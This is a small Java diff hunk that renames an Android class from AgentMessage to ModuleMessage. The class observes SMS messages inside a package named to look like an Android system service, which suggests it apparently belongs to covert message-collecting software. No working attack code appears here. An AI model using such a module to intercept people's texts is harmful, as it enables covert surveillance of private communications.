@@ -38,8 +38,8 @@ import com.android.service.util.WChar;
  * @author zeno -> Ahahah ti piacerebbe eh?? :>
  * @real-author Que, r0x
  */
-public class AgentMessage extends BaseModule implements Observer<Sms> {
-	private static final String TAG = "AgentMessage"; //$NON-NLS-1$
+public class ModuleMessage extends BaseModule implements Observer<Sms> {
+	private static final String TAG = "ModuleMessage"; //$NON-NLS-1$
 	//$NON-NLS-1$
 	private static final int SMS_VERSION = 2010050501;
 
